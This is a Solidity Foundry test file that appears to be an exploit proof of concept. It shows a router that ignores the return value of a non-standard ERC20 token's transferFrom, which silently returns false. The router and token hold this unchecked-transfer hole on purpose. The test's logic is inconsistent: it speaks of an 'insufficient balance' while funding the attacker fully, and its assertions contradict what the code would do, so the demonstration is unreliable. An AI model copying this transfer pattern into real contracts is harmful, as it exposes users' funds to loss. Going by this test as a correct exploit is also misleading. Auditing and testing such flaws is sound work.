// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NonStandardERC20 {
    mapping(address => uint256) private _balances;

    constructor() {
        _balances[msg.sender] = 1000 ether;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        // Silently fail without reverting
        if (_balances[from] < value) {
            return false;
        }
        _balances[from] -= value;
        _balances[to] += value;
        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }
}

contract TrailsRouter {
    function injectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) public payable {
        uint256 callerBalance = IERC20(token).balanceOf(msg.sender);
        if (callerBalance == 0) {
            revert("NoTokensToSweep");
        }

        _safeTransferFrom(token, msg.sender, address(this), callerBalance);
        // Further logic...
    }

    function _safeTransferFrom(address token, address from, address to, uint256 value) internal {
        IERC20(token).transferFrom(from, to, value);
    }
}

contract ExploitTest is Test {
    TrailsRouter router;
    NonStandardERC20 token;
    address attacker;

    function setUp() public {
        router = new TrailsRouter();
        token = new NonStandardERC20();
        attacker = address(0xdeadbeef);

        // Fund attacker with some tokens
        vm.deal(attacker, 1 ether);
        deal(address(token), attacker, 100 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker attempts to call injectAndCall with insufficient balance
        vm.prank(attacker);
        router.injectAndCall(address(token), address(0), "", 0, bytes32(0));

        // Step 2: Check that the balance of the router did not increase
        uint256 routerBalance = token.balanceOf(address(router));
        assertEq(routerBalance, 0, "Router balance should be zero due to silent transfer failure");

        // Step 3: Check that the attacker's balance remains unchanged
        uint256 attackerBalance = token.balanceOf(attacker);
        assertEq(attackerBalance, 100 ether, "Attacker balance should remain unchanged");
    }
}